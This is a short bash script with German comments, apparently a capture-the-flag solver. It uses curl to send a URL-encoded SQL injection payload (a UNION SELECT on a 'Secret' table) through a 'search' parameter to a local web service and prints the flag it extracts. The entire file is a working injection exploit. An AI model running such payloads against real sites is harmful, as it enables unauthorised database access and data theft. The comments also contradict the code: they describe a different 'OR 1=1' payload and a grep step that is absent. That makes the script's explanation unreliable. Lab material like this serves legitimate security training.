#!/bin/bash

# Konfiguration (Passe die IP/Port an, falls deine Challenge woanders läuft)
TARGET_URL="http://127.0.0.1:8080/"

# Die SQL-Injection Payload: Kaffee' OR 1=1 OR name='
# Da wir den String per URL-Parameter (GET) senden, müssen wir ihn URL-encoden:
# Leerzeichen -> %20
# Hochkomma (') -> %27
# Gleichheitszeichen (=) -> %3D
PAYLOAD="%27%20UNION%20SELECT%20name%2C%20description%20FROM%20Secret%20WHERE%20%271%27%3D%271"

echo "[*] Sende Exploit-Payload an $TARGET_URL..."

# 1. Curl feuert den Request ab
# 2. Grep filtert nach der Zeile, die das Wort "Beer" (aus deiner Go-Beschreibung) enthält
# 3. Sed schneidet die HTML-Tags ab, damit nur noch der Text übrig bleibt
RESULT=$(curl -s "${TARGET_URL}?search=${PAYLOAD}" | sed -e 's/<[^>]*>//g')

if [ -z "$RESULT" ]; then
    echo "[-] Fehler: Keine Flagge gefunden. Läuft der Container und stimmt die Payload?"
else
    echo "[+] Erfolg! Hier ist die Flagge:"
    echo "--------------------------------------------------"
    # Trimmt führende Leerzeichen
    echo "$RESULT" | xargs
    echo "--------------------------------------------------"
fi